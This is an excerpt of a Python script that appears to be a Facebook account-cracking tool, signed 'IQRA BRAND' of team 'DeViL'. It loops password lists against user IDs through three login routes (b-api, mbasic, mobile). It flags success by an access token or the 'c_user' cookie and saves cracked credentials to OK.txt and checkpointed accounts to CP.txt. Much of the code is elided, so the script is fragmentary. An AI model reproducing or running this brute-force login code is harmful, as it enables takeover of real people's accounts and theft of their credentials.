...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#IQRA_BRAND('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							IQRA_BRAND('[•] Result CP saved to CP.txt')
							IQRA_BRAND('\n\tCrack Processing...\n')
							IQRA_BRAND('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					IQRA_BRAND('\n01.) Metode b-api ')
					IQRA_BRAND('02.) Metode mbasic ')
					IQRA_BRAND('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			IQRA_BRAND('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			IQRAZ_BRAND(' [1] AKING Method 1 ')
			IQRA_BRAND(' [2] AKING Method 2  [ Pro ]')
			IQRA_BRAND(' [3] AKING Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [IQRA] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if "access_token" in p:
				IQRA_BRAND('\r\033[1;92m[Successful-IQRA] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					...
					IQRA_BRAND('\r\033[1;91m[Checkpoint-IQRA] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				IQRA_BRAND('\r\033[1;91m[Checkpoint-IQRA] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				IQRA_BRAND('\r\033[1;32m[Successful-IQRA] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				IQRA_BRAND('\r\033[1;92m[Successful-IQRA] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
...
[*]=============================================
    Author   : IQRA BRAND
    Facebook : https://facebook.com/Hunter Iqra
    Team     : DeViL
    Connect  : 03*********
 [*]=============================================
